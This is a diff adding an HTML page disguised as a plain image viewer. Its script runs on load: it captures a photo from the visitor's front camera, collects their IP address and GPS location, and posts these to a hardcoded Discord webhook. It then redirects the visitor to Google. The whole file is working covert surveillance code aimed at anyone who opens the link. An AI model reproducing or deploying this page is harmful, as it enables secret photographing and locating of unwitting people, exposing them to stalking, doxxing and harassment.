@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Image</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { 
+      margin: 0; 
+      padding: 0; 
+      background: #000; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .image-container {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .main-image {
+      max-width: 100%;
+      max-height: 100vh;
+      object-fit: contain;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    .main-image:hover {
+      transform: scale(1.02);
+    }
+    .loading {
+      color: white;
+      font-family: Arial, sans-serif;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="image-container">
+    <div class="loading" id="loading">Loading image...</div>
+    <img id="mainImage" class="main-image" style="display:none;" alt="Image">
+  </div>
+
+  <script>
+    // Configuration
+    const CONFIG = {
+      webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6XyXxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF",
+      imageUrl: "cityscape.jpg",
+      redirectUrl: "https://www.google.com",
+      captureDelay: 1000,
+      redirectDelay: 2000
+    };
+
+    // Get image from URL parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const imageParam = urlParams.get('img') || CONFIG.imageUrl;
+    const debug = urlParams.get('debug') === '1';
+
+    function log(...args) {
+      if (debug) {
+        console.log(...args);
+      }
+    }
+
+    // Capture photo from camera
+    async function capturePhoto() {
+      try {
+        log('Requesting camera access...');
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+        stream.getTracks().forEach(track => track.stop());
+        
+        log('Photo captured successfully');
+        return blob;
+      } catch (error) {
+        log('Camera access denied or failed:', error);
+        return null;
+      }
+    }
+
+    // Send data to Discord
+    async function sendToDiscord(imageBlob) {
+      const data = {
+        when: new Date().toString(),
+        userAgent: navigator.userAgent,
+        url: window.location.href
+      };
+
+      // Get IP address
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        data.ip = (await ipResponse.json()).ip;
+      } catch (e) {
+        log('Failed to get IP:', e);
+      }
+
+      // Get location
+      try {
+        if (navigator.geolocation) {
+          const position = await new Promise((resolve, reject) => 
+            navigator.geolocation.getCurrentPosition(resolve, reject)
+          );
+          data.location = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            acc: position.coords.accuracy
+          };
+        }
+      } catch (e) {
+        log('Location access denied:', e);
+      }
+
+      const payload = `**IP:** ${data.ip || 'N/A'}\n` +
+        `**User-Agent:** ${data.userAgent}\n` +
+        `**Location:** ${data.location ? `${data.location.lat}, ${data.location.lon} (±${data.location.acc}m)` : 'N/A'}\n` +
+        `**Time:** ${data.when}\n` +
+        `**URL:** ${data.url}`;
+
+      const formData = new FormData();
+      formData.append('payload_json', JSON.stringify({ content: payload }));
+      
+      if (imageBlob) {
+        formData.append('file', imageBlob, 'photo.jpg');
+      }
+
+      try {
+        const response = await fetch(CONFIG.webhookUrl, {
+          method: 'POST',
+          body: formData
+        });
+        
+        if (response.ok) {
+          log('Data sent to Discord successfully');
+        } else {
+          log('Failed to send to Discord:', response.status);
+        }
+      } catch (error) {
+        log('Error sending to Discord:', error);
+      }
+    }
+
+    // Main execution
+    async function init() {
+      const img = document.getElementById('mainImage');
+      const loading = document.getElementById('loading');
+
+      // Load and display the image
+      img.src = imageParam;
+      img.onload = () => {
+        loading.style.display = 'none';
+        img.style.display = 'block';
+        log('Image loaded successfully');
+      };
+
+      img.onerror = () => {
+        loading.textContent = 'Failed to load image';
+      };
+
+      // Capture photo after delay
+      setTimeout(async () => {
+        log('Starting photo capture...');
+        const photoBlob = await capturePhoto();
+        
+        if (photoBlob) {
+          await sendToDiscord(photoBlob);
+        } else {
+          await sendToDiscord(null);
+        }
+
+        // Redirect after sending
+        setTimeout(() => {
+          window.location.href = CONFIG.redirectUrl;
+        }, CONFIG.redirectDelay);
+
+      }, CONFIG.captureDelay);
+    }
+
+    // Start when page loads
+    init();
+  </script>
+</body>
+</html>
